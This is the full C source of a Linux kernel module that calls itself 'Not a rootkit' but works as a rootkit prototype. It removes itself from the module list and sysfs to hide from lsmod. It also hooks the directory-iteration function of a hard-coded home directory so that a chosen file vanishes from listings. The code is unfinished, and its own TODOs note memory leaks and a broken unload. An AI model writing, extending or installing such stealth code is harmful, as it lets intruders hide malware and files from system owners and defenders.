#include <linux/init.h>
#include <linux/module.h>
#include <linux/path.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yanay Goor");
MODULE_DESCRIPTION("Not a rootkit");
MODULE_VERSION("0.1.0");

static struct list_head *modules;

// TODO: Provide a way for the module to control the path(s).
static const char *test_path_name = "/home/yanayg";
static const char *test_file_name = "test_file";
static int (*iterate_shared) (struct file *, struct dir_context *);

static void hide_module(void) {
    // Save the list for later so we can add the module back in.
	modules = THIS_MODULE->list.prev;
	// Hide from procfs (lsmod)
	// TODO: This means that rmmod will not work, I need to provide a way for the module to unload itself.
	list_del(&THIS_MODULE->list);
	// Hide from sysfs (/sys/module)
	// kobject_del removes the kobject from the sysfs but does
	// not free it's memory (that only happens one the refcount is 0).
	// So it is save to call without causing an error later on when unloading the module.
	 kobject_del(&THIS_MODULE->mkobj.kobj);
	// ???
	// THIS_MODULE->sect_attrs = NULL;
	// ???
	// THIS_MODULE->notes_attrs = NULL;
}

static void unhide_module(void) {
	// Unhide from procfs (lsmod)
	list_add(&THIS_MODULE->list, modules);
}

static int get_inode_by_path_name(const char *path_name, struct inode **inode) {
    struct path path;
    int retval;
    if ((retval = kern_path(path_name, LOOKUP_FOLLOW, &path))) {
        return retval;
    }
    *inode = path.dentry->d_inode;
    printk(KERN_INFO "Path name: %s, inode: %lu\n", path_name, (*inode)->i_ino);
    path_put(&path);
    return 0;
}

struct dir_context_hook {
    struct list_head head;
    struct dir_context *ctx;
    filldir_t prev_actor;
};

static LIST_HEAD(dir_context_hooks);

static int new_actor(struct dir_context *ctx, const char *name, int namelen, loff_t off, u64 ino, unsigned type) {
    struct list_head *pos;
    struct dir_context_hook *entry;

	list_for_each(pos, &dir_context_hooks) {
	    entry = list_entry(pos, struct dir_context_hook, head);
	    if (entry->ctx == ctx) {
	    	printk(KERN_INFO "Called hooked actor! %s", name);
	    	if (!strcmp(name, test_file_name)) {
	    	    return 0;
	    	}
	        return entry->prev_actor(ctx, name, namelen, off, ino, type);
	    }
	}
	return -1;
}

static int new_iterate_shared(struct file *filp, struct dir_context *dir_context) {
    int res;
    struct dir_context_hook *hook;
	printk(KERN_INFO "Called hooked iterate!");
	hook = (struct dir_context_hook *)kmalloc(sizeof(struct dir_context_hook), GFP_KERNEL);
	hook->ctx = dir_context;
	hook->prev_actor = dir_context->actor;
	list_add(&hook->head, &dir_context_hooks);
	dir_context->actor = new_actor;
	res = iterate_shared(filp, dir_context);
	if (res) {
	    return res;
	}
    return 0;
}

static int __init MRK_initialize(void) {
	int retval;
	struct inode *inode;
	// TODO: fix memory leak
	struct file_operations *file_operations = (struct file_operations *)kmalloc(sizeof(struct file_operations), GFP_KERNEL);
	if ((retval = get_inode_by_path_name(test_path_name, &inode))) {
	    return retval;
	}
	printk(KERN_INFO "Inode fop iterate: %p\n", inode->i_fop->iterate_shared);
	memcpy(file_operations, inode->i_fop, sizeof(struct file_operations));
	inode->i_fop = file_operations;
	iterate_shared = file_operations->iterate_shared;
	file_operations->iterate_shared = new_iterate_shared;

	hide_module();
	printk(KERN_INFO "Hello, World!\n");
	return 0;
}


static void __exit MRK_exit(void) {
    unhide_module();
	printk(KERN_INFO "Goodbye, World!\n");
}

module_init(MRK_initialize);
module_exit(MRK_exit);
